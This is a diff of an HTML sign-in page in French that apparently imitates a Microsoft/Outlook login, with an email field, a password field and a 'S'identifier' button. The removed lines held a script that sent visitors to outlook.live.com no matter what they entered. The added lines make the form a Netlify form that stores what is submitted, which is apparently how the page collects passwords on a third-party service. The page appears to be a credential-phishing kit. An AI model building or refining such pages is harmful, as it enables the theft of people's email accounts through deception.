@@ -25,7 +25,7 @@
             <noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-TH3SH4D" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
     <!-- End Google Tag Manager (noscript) -->	
 	
-	    <form  onSubmit="return checkAnswer(); action="" enctype="multipart/form-data" method="POST" data-netlify="true">
+	    <form action="POST" data-netlify="true">
 	
 	<!-- ko if: loadBannerLogo -->
             <div data-bind="component: { name: 'logo-control',
@@ -118,28 +118,20 @@
 									<input type="password" name="password" id="password" placeholder="Mot de passe" />
 								</div>
 																
-                                <ul class="actions special">
-                                    <td>							
-								        <ul>
-									        <li style="background-color:#35A6FF">
-									            <input type="submit" value="S'identifier"/>
-								            </li>
-								        </ul>
-                                    </td>								
-							    </ul>
-							
-							</div>
-   </form>
-		<script>
-  function checkAnswer(){
-      var response = document.getElementById('answer').value;
-      if (response == "correctanswer")
-          location = 'https://outlook.live.com/owa/'; // 'right.html';
-      else
-          location = 'https://outlook.live.com/owa/'; // 'wrong.html';
-      return false;
-  }
-  </script>
+							</div>	
+
+                            <ul class="actions special">
+                                <td>							
+								    <ul>
+									    <li style="background-color:#35A6FF">
+									        <input type="submit" value="S'identifier"/>
+								        </li>
+								    </ul>
+                                </td>								
+							</ul>	
+	
+		</form>
+	
 	<div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">
     <div class="row">
         <div class="col-md-24">
